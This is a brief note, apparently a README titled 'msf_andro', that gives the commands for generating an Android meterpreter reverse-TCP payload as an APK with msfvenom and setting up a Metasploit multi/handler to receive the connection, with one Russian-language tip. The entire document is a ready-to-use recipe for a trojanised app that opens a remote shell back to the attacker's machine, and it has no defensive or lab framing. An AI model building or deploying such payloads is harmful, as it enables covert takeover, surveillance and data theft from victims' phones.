# msf_andro

```sh
msfvenom -p android/meterpreter/reverse_tcp LHOST=(my ip) LPORT=4444 R > andro.apk

msfconsole

use  exploit/multi/handler

set PAYLOAD android/meterpreter/reverse_tcp

set LHOST my ip

exploit

? - для просмотра доступных команд
